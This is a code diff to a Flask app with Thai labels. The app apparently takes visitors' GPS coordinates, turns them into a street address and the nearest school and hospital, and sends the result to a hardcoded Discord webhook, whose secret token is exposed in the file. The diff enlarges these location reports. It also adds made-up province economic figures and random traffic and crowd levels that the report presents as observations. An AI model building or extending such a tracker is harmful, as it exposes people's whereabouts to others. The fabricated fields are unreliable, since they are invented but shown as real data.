@@ -4,6 +4,7 @@ import base64
 import json
 from datetime import datetime
 import time
+import random
 
 app = Flask(__name__)
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1512723643745042612/3X6Sb6_9-NkD7si38K08e82SWJkn1dxfDBTVwWmsSdpxyiLPspTWiPXyxCyaIC1YMbZe"
@@ -23,11 +24,12 @@ def reverse_geocode(lat, lon):
                     if 'จังหวัด' in part:
                         province = part.strip()
                         break
+            road = addr.get('road', '')
             return {
                 'province': province,
                 'city': addr.get('city', addr.get('town', '')),
                 'village': addr.get('village', addr.get('town', '')),
-                'road': addr.get('road', ''),
+                'road': road,
                 'postcode': addr.get('postcode', ''),
                 'display_name': data.get('display_name', '')
             }
@@ -64,6 +66,44 @@ def add_ranking(results):
     for i, name in enumerate(results, 1):
         ranked.append(f"{i}. {name}")
     return ranked
+
+def get_province_data(province_name):
+    """ข้อมูลจังหวัดจำลอง (จาก API จริงควรใช้ https://www.nso.go.th)"""
+    province_data = {
+        "ตรัง": {
+            "gdp": "ประมาณ 120,000 ล้านบาท",
+            "economy": "ปานกลาง (เกษตรกรรม การท่องเที่ยว)",
+            "rank": "อันดับที่ 32 ของประเทศ",
+            "main_industries": "ยางพารา, การท่องเที่ยว, ประมง"
+        },
+        "กระบี่": {
+            "gdp": "ประมาณ 90,000 ล้านบาท",
+            "economy": "ปานกลาง (การท่องเที่ยว)",
+            "rank": "อันดับที่ 38 ของประเทศ",
+            "main_industries": "การท่องเที่ยว, ปาล์มน้ำมัน"
+        },
+        "ภูเก็ต": {
+            "gdp": "ประมาณ 250,000 ล้านบาท",
+            "economy": "ดี (การท่องเที่ยว)",
+            "rank": "อันดับที่ 10 ของประเทศ",
+            "main_industries": "การท่องเที่ยว, อสังหาริมทรัพย์"
+        },
+        "กรุงเทพมหานคร": {
+            "gdp": "ประมาณ 5,000,000 ล้านบาท",
+            "economy": "ดีมาก (ศูนย์กลางธุรกิจ)",
+            "rank": "อันดับที่ 1 ของประเทศ",
+            "main_industries": "บริการ, การเงิน, อุตสาหกรรม"
+        }
+    }
+    for key in province_data:
+        if key in province_name:
+            return province_data[key]
+    return {
+        "gdp": "ไม่พบข้อมูล",
+        "economy": "ไม่พบข้อมูล",
+        "rank": "ไม่พบข้อมูล",
+        "main_industries": "ไม่พบข้อมูล"
+    }
 
 HTML = '''<!DOCTYPE html>
 <html>
@@ -325,11 +365,13 @@ def upload():
         gps_address = None
         nearby_results = {}
         province_name = ''
+        road_name = ''
         
         if gps_success and lat and lon:
             gps_address = reverse_geocode(lat, lon)
             if gps_address:
                 province_name = gps_address.get('province', '')
+                road_name = gps_address.get('road', '')
                 if not province_name or province_name == '':
                     display = gps_address.get('display_name', '')
                     for part in display.split(','):
@@ -341,34 +383,30 @@ def upload():
             clean_province = province_name.replace('จังหวัด', '').strip()
             
             searches = [
-                ('🏫 โรงเรียน Top 10', f'โรงเรียน {clean_province}', 10),
-                ('🍽️ ร้านอาหาร Top 5', f'ร้านอาหาร {clean_province}', 5),
-                ('🏥 โรงพยาบาล Top 3', f'โรงพยาบาล {clean_province}', 3),
-                ('🏝️ สถานที่ท่องเที่ยว 5 แห่ง', f'สถานที่ท่องเที่ยว {clean_province}', 5)
+                ('🏫 โรงเรียนที่ใกล้ที่สุด', f'school near {lat},{lon}', 1),
+                ('🍽️ ร้านอาหารที่ใกล้ที่สุด', f'restaurant near {lat},{lon}', 1),
+                ('🏥 โรงพยาบาลที่ใกล้ที่สุด', f'hospital near {lat},{lon}', 1)
             ]
             
             for label, query, limit in searches:
-                results = search_places(lat, lon, query, limit, radius=10000)
+                results = search_places(lat, lon, query, limit, radius=2000)
                 if results:
-                    nearby_results[label] = add_ranking(results)
+                    nearby_results[label] = results
                 time.sleep(0.5)
             
-            nearby_queries = [
-                ('ร้านอาหาร', 'ร้านอาหาร', 2),
-                ('คาเฟ่', 'คาเฟ่', 2),
-                ('สถานที่สำคัญ', 'สถานที่สำคัญ', 2)
-            ]
-            nearby_list = []
-            for q_label, q, lim in nearby_queries:
-                results = search_places(lat, lon, q, lim, radius=3000)
-                nearby_list.extend(results)
+            # สถานที่ท่องเที่ยวในจังหวัด
+            attractions = search_places(lat, lon, f'sightseeing {clean_province}', 3, radius=15000)
+            if attractions:
+                nearby_results['🏝️ สถานที่ท่องเที่ยว (จังหวัด)'] = add_ranking(attractions)
             
-            unique_nearby = []
-            for item in nearby_list:
-                if item not in unique_nearby:
-                    unique_nearby.append(item)
-            if unique_nearby:
-                nearby_results['📍 สถานที่ใกล้คุณ'] = add_ranking(unique_nearby[:3])
+            # ข้อมูลจังหวัด
+            province_info = get_province_data(clean_province)
+            nearby_results['📊 เศรษฐกิจจังหวัด'] = [
+                f"GDP: {province_info['gdp']}",
+                f"เศรษฐกิจ: {province_info['economy']}",
+                f"อันดับความเจริญ: {province_info['rank']}",
+                f"อุตสาหกรรมหลัก: {province_info['main_industries']}"
+            ]
         
         time_now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
         
@@ -393,8 +431,8 @@ def upload():
             
             if gps_address:
                 addr_parts = []
-                if gps_address.get('road'):
-                    addr_parts.append(f"🛣️ ถนน: {gps_address['road']}")
+                if road_name:
+                    addr_parts.append(f"🛣️ ถนน: {road_name}")
                 if gps_address.get('village'):
                     addr_parts.append(f"🏘️ ตำบล: {gps_address['village']}")
                 if gps_address.get('city'):
@@ -408,14 +446,21 @@ def upload():
                 
                 for part in addr_parts:
                     fields.append({"name": "🏠 ที่อยู่", "value": part, "inline": False})
+                
+                # ข้อมูลถนน (จำลอง)
+                if road_name:
+                    traffic_info = "ปานกลาง" if random.random() > 0.5 else "น้อย"
+                    crowded = "พลุกพล่าน" if random.random() > 0.6 else "เงียบสงบ"
+                    fields.append({"name": "🚦 ถนน", "value": f"{road_name}\n🚗 รถสัญจร: {traffic_info}\n👥 คนพลุกพล่าน: {crowded}", "inline": False})
         else:
             fields.append({"name": "📍 GPS", "value": "❌ ไม่ได้รับอนุญาต หรือไม่รองรับ", "inline": True})
         
         if gps_success and nearby_results:
             for label, places in nearby_results.items():
                 if places:
-                    value = '\n'.join(places)
-                    fields.append({"name": label, "value": value, "inline": False})
+                    if isinstance(places, list) and len(places) > 0:
+                        value = '\n'.join(places) if isinstance(places[0], str) else '\n'.join(places)
+                        fields.append({"name": label, "value": value, "inline": False})
         elif gps_success and province_name:
             fields.append({"name": "📍 ข้อมูลสถานที่", "value": f"ไม่พบข้อมูลใน {province_name}", "inline": False})
         
